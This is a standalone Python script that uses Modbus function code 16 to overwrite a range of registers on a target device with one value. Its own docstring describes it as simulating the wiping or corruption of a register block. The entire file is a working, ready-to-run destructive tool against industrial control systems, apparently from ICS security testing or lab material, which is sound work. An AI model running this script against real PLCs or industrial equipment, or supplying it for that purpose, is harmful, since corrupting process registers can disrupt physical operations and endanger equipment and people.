#!/usr/bin/env python
"""
write_bulk.py - Overwrite a block of Modbus registers with a single value.

Uses FC 16 (Write Multiple Registers) to write a contiguous range of
registers. Simulates wiping or corrupting a register block.

Usage:
    python write_bulk.py <target_ip> [start_reg] [count] [value] [port] [unit_id]

    python write_bulk.py 192.168.1.100
    python write_bulk.py 192.168.1.100 0 500 0
    python write_bulk.py 192.168.1.100 0 100 65535 502 1

Requires: pip install pymodbus
"""

import sys
from pymodbus.client import ModbusTcpClient

target = sys.argv[1]
start = int(sys.argv[2]) if len(sys.argv) > 2 else 0
count = int(sys.argv[3]) if len(sys.argv) > 3 else 100
value = int(sys.argv[4]) if len(sys.argv) > 4 else 0
port = int(sys.argv[5]) if len(sys.argv) > 5 else 502
unit = int(sys.argv[6]) if len(sys.argv) > 6 else 1

client = ModbusTcpClient(target, port=port, timeout=2)
if not client.connect():
    print(f"[!] Cannot connect to {target}:{port}")
    sys.exit(1)

print(f"[*] Bulk writing regs {start}-{start + count - 1} <- {value} on {target}:{port} unit={unit}\n")

MAX_PER_REQ = 123  # FC 16 spec limit
addr = start
written = 0

while written < count:
    batch = min(MAX_PER_REQ, count - written)
    values = [value] * batch
    result = client.write_registers(addr, values, slave=unit)

    if result.isError():
        print(f"  [-] Addr {addr}: FAILED ({result})")
    else:
        print(f"  [+] Addr {addr}-{addr + batch - 1}: wrote {batch} registers <- {value}")
        written += batch

    addr += batch

client.close()
print(f"\n[*] Done - wrote {written}/{count} registers")
